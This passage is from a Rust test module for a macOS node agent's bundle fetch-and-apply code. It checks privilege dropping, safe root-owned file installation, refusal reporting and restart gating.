            r#"root_install(b, Path::new(&daemon_plist), 0o644)"#,
            r#"root_install(cli, Path::new(NOO_ROOT_BIN), 0o755)"#,
            r#"root_install(b, &dst, 0o644)"#,
            r#"root_install(b, &anchors.join(name), 0o644)"#,
        ] {
            assert!(f.contains(needle), "missing: {needle}");
        }
        let h = body("install_hostd");
        assert!(h.contains("root_install(hostd_bytes, hostd, 0o755)") && h.contains("root_install(p, &prev, 0o755)"));
        assert!(body("root_install").contains("privs::root()"));
        let w = body("write_new_file");
        assert!(w.contains("create_new(true)") && w.contains("O_NOFOLLOW") && w.contains(".mode(mode)"));
        // The verified payloads are read while the stage is root's alone.
        assert!(f.find("verified_payloads(").unwrap() < f.find("drop(root_guard)").unwrap());
    }

    #[test]
    fn root_state_lives_in_roots_directory() {
        let f = body("node_fetch");
        assert!(f.contains("take_reexec_bundle(Path::new(ROOT_STATE_DIR)"));
        assert!(f.contains("leave_reexec_bundle(Path::new(ROOT_STATE_DIR)"));
        assert!(super::ROOT_STATE_DIR.starts_with("/Library/Application Support/noomesh/"));
        // The last-applied hash is root's, not the user's (re-arming).
        assert_eq!(last_bundle_path(Path::new("/Users/u/noomesh"), true), Path::new(ROOT_STATE_DIR).join("last-bundle.sha256"));
        assert!(f.contains("last_bundle_path(&base, as_root)"));
        // The stage is under root's state dir, not the shared temp dir.
        let p = body("private_stage_dir");
        assert!(p.contains("ensure_root_state_dir(Path::new(ROOT_STATE_DIR))"));
        assert!(body("leave_reexec_bundle").contains("ensure_root_state_dir(state)"));
        let e = body("ensure_root_state_dir");
        assert!(e.contains("root_dir_trustworthy(p)") && e.contains("root_dir_trustworthy(state)"));
        // A teardown's purge (a path from the user-writable agent.env) runs
        // after root is dropped again.
        let d = body("darwin_dismantle");
        assert!(d.find("drop(root_guard)").unwrap() < d.find("if purge_data").unwrap());
    }

    // ── verification review of #970 ────────────────────────────────

    /// Item 1: a refusal reaches the controller in the report message, in
    /// the shape `cluster verify` reads; a clean apply's message is unchanged.
    #[test]
    fn a_root_refusal_rides_the_apply_report() {
        let v = "verified-by: signing-key ca-lane: retired";
        assert_eq!(apply_report_msg(v, &[]), format!("applied {v}"));
        assert_eq!(apply_report_msg("", &[]), "applied");
        let m = apply_report_msg(v, &["noo-cli".into(), "noo-hostd".into()]);
        assert_eq!(m, format!("applied {v} {ROOT_REFUSED_TAG} noo-cli,noo-hostd"));
        let c = crate::commands::cluster_verify::with_node_root_refusals(
            crate::commands::cluster_verify::ok("legacy lanes", "0 uses"),
            &[("host6".into(), Some(0), m)],
        );
        assert!(c.detail.contains("host6 (noo-cli, noo-hostd)"), "{}", c.detail);
    }

    /// Item 1, the call sites: "CLI updated" only when root's copy was
    /// written, and every refusal path of the CLI and the helper is recorded.
    #[test]
    fn every_root_refusal_is_recorded_and_success_is_claimed_only_on_success() {
        let f = body("darwin_apply");
        let claim = f.find(r#"done("noo node fetch: CLI updated from the bundle")"#).unwrap();
        assert!(f[..claim].ends_with("if root_ok {\n            crate::ui::"), "CLI updated is printed outside `if root_ok`");
        assert!(f.contains(r#"note_root_refused("noo-cli")"#));
        assert_eq!(body("install_hostd").matches(r#"note_root_refused("noo-hostd")"#).count(), 2);
        let n = body("node_fetch");
        assert!(n.contains("apply_report_msg(&last_verified(), &refused)"));
        assert!(n.contains("ROOT_REFUSED_TAG"), "a failed apply drops the refusal");
        // A teardown reports what `tailscale logout` did.
        assert!(n.contains("teardown applied; {d}"));
        assert!(body("darwin_dismantle").contains("tailscale logout rc {rc}"));
        // The user's own copy failing is said, not swallowed.
        assert!(f.contains("the user's CLI ({}) was not updated"));
    }

    /// Item 2: the agent's directories are reclaimed on every root apply,
    /// not only at the tail of a hostd install that may be absent or refused.
    #[test]
    fn the_agent_dirs_are_reclaimed_whether_or_not_hostd_is_installed() {
        let f = body("darwin_apply");
        let hostd = f.find("install_hostd(hostd_bytes)").unwrap();
        let reclaim = f.find("if as_root {\n        reclaim_agent_dirs(user);\n    }").expect("reclaim is not gated on as_root alone");
        assert!(hostd < reclaim, "reclaim must follow hostd's install, which creates the spool");
        assert!(!body("install_hostd").contains("claim_agent_dirs"));
        assert!(body("reclaim_agent_dirs").contains("claim_agent_dirs(Path::new(AGENT_STATE_DIR), uid, gid, true)"));
    }

    /// Item 3: the cadence files are written by rename, so a copy the user
    /// cannot write (root's, left by v0.2.103) is replaced, not kept.
    #[test]
    fn a_cadence_file_the_user_cannot_write_is_replaced() {
        let d = scratch("cadence");
        let p = d.join("expect-bundle");
        std::fs::write(&p, "3\n").unwrap();
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o444)).unwrap();
        set_cadence(&p, "10\n");
        assert_eq!(std::fs::read_to_string(&p).unwrap(), "10\n");
        let n = body("node_fetch");
        for bare in ["std::fs::write(&expect", "std::fs::write(&state"] {
            assert!(!n.contains(bare), "a cadence file is written in place again: {bare}");
        }
        let _ = std::fs::remove_dir_all(&d);
    }

    /// Item 3 with a real root-owned leftover, replaced by the LOWERED poll.
    #[test]
    fn root_only_a_root_owned_cadence_file_is_replaced_by_the_lowered_poll() {
        if !require_root("root_only_a_root_owned_cadence_file_is_replaced_by_the_lowered_poll") {
            return;
        }
        let d = scratch("cadence-root");
        std::os::unix::fs::chown(&d, Some(65534), Some(65534)).unwrap();
        let p = d.join("fetch-state");
        std::fs::write(&p, "7\n").unwrap();
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o600)).unwrap();
        let code = in_child(|| {
            if privs::drop_to("nobody").is_err() { return 10; }
            if std::fs::write(&p, "x").is_ok() { return 11; }
            set_cadence(&p, "0\n");
            if std::fs::read_to_string(&p).ok().as_deref() != Some("0\n") { return 12; }
            0
        });
        let owner = std::fs::metadata(&p).map(|m| m.uid()).unwrap_or(0);
        let _ = std::fs::remove_dir_all(&d);
        assert_eq!(code, 0, "child failed step {code} (11: the lowered poll could write root's file in place; 12: it was not replaced)");
        assert_eq!(owner, 65534, "the replaced file is the user's");
    }

    /// Item 4: root's marker decides; without one, the user's old marker
    /// may only SKIP (and seed root's), never cause an apply.
    #[test]
    fn the_pre_move_marker_only_skips_and_seeds_roots() {
        let (a, b) = ("a".repeat(64), "b".repeat(64));
        assert_eq!(already_applied(Some(&a), None, &a), (true, false));
        assert_eq!(already_applied(Some(&a), Some(&b), &b), (false, false), "root's marker decides once it exists");
        assert_eq!(already_applied(None, Some(&a), &a), (true, true), "upgrade: skip and seed root's marker");
        assert_eq!(already_applied(None, Some(&b), &a), (false, false));
        assert_eq!(already_applied(None, None, &a), (false, false));
        let n = body("node_fetch");
        assert!(n.contains("let user_seen = if as_root && last_seen.is_none()"));
        let skip = n.find("if skip {").unwrap();
        assert!(n[skip..].find("record_last(&sum)").unwrap() < n[skip..].find("return Ok(0)").unwrap());
    }

    #[test]
    fn a_stage_is_always_fresh_and_private() {
        let d = scratch("stage");
        let s = private_stage_dir_in(&d, "x").unwrap();
        assert_eq!(std::fs::metadata(&s).unwrap().mode() & 0o777, 0o700);
        let _ = std::fs::remove_dir_all(&d);
    }

    // ── a restage of bytes the node already runs ───────────────────────

    #[test]
    fn installed_matches_needs_positive_proof() {
        use std::os::unix::fs::PermissionsExt;
        let d = scratch("unchanged-bytes");
        let f = d.join("noo-node-agent");
        // First install: nothing on disk.
        assert!(!installed_matches(&f, b"v1", 0o755), "an absent file is not a match");
        std::fs::write(&f, b"v1").unwrap();
        std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
        assert!(installed_matches(&f, b"v1", 0o755));
        assert!(!installed_matches(&f, b"v2", 0o755), "different bytes install");
        assert!(!installed_matches(&f, b"v1", 0o700), "same bytes at another mode install");
        assert!(!installed_matches(&f, b"", 0o755), "an empty payload is never a match");
        std::fs::write(&f, b"").unwrap();
        std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
        assert!(!installed_matches(&f, b"v1", 0o755), "an empty installed file is installed over");
        assert!(!installed_matches(&d, b"v1", 0o755), "a directory is not a binary");
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn unchanged_binaries_ride_the_report_as_a_distinct_token() {
        let m = with_binary_summary("applied v".into(), &["agent-binary=unchanged".into(), "hostd-binary".into()], &["agent-binary=ab".into()]);
        assert_eq!(m, "applied v applied: agent-binary=unchanged hostd-binary binary-sha: agent-binary=ab");
        assert_eq!(with_binary_summary("applied v".into(), &[], &[]), "applied v", "no binary, message unchanged");
        // The controller's whole-token lookup: `=unchanged` is NOT "installed".
        assert!(!crate::commands::provision::applier_applied(&m, "agent-binary"));
        assert!(crate::commands::provision::applier_applied(&m, "agent-binary=unchanged"));
        assert!(crate::commands::provision::applier_applied(&m, "hostd-binary"));
        // The root-refusal tag still parses when both are present.
        let both = with_binary_summary(apply_report_msg("v", &["noo-cli".into()]), &["cli-binary".into()], &[]);
        assert!(both.contains(&format!("{ROOT_REFUSED_TAG} noo-cli")));
    }

    #[test]
    fn the_agent_inputs_fingerprint_moves_only_with_what_the_agent_loads() {
        let d = scratch("agent-inputs");
        let base = d.join("noomesh");
        for sub in ["pki", "bin", "secrets"] {
            std::fs::create_dir_all(base.join(sub)).unwrap();
        }
        let plist = d.join("agent.plist");
        std::fs::write(&plist, "p").unwrap();
        std::fs::write(base.join("agent.env"), "A=1\n").unwrap();
        std::fs::write(base.join("bin/noo-node-agent"), "bin1").unwrap();
        let a = agent_inputs_fingerprint(&base, &plist);
        assert_eq!(a, agent_inputs_fingerprint(&base, &plist), "stable");
        // Rewriting identical bytes (what a restage does) changes nothing.
        std::fs::write(base.join("agent.env"), "A=1\n").unwrap();
        assert_eq!(a, agent_inputs_fingerprint(&base, &plist));
        // Files the agent does not load do not count.
        std::fs::write(base.join("harness.env"), "H=1").unwrap();
        std::fs::write(base.join("bin/noo-gateway"), "gw").unwrap();
        assert_eq!(a, agent_inputs_fingerprint(&base, &plist));
        for (rel, body) in [("agent.env", "A=2\n"), ("bin/noo-node-agent", "bin2"), ("secrets/tok", "t"), ("pki/svc-vllm.crt", "c")] {
            let before = agent_inputs_fingerprint(&base, &plist);
            std::fs::write(base.join(rel), body).unwrap();
            assert_ne!(before, agent_inputs_fingerprint(&base, &plist), "{rel} must move the digest");
        }
        let before = agent_inputs_fingerprint(&base, &plist);
        std::fs::write(&plist, "p2").unwrap();
        assert_ne!(before, agent_inputs_fingerprint(&base, &plist), "the plist moves it");
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn the_agent_restart_is_gated_on_proof_and_a_loaded_daemon() {
        let f = body("darwin_apply");
        let gate = f.find("inputs_before == inputs_after").expect("restart gate");
        assert!(f[gate..].contains(r#"launchctl(&["print", &target]).0 == 0"#), "skip needs the daemon loaded");
        assert!(gate < f.find(r#"launchctl(&["bootout", &target])"#).unwrap());
        assert!(f.contains(r#"inst_bin("agent-binary""#) && f.contains(r#"inst_bin("harness-binary""#));
        assert!(f.contains(r#"note_binary("hostd-binary", true"#) && f.contains(r#"note_binary("cli-binary", true"#));
    }
}
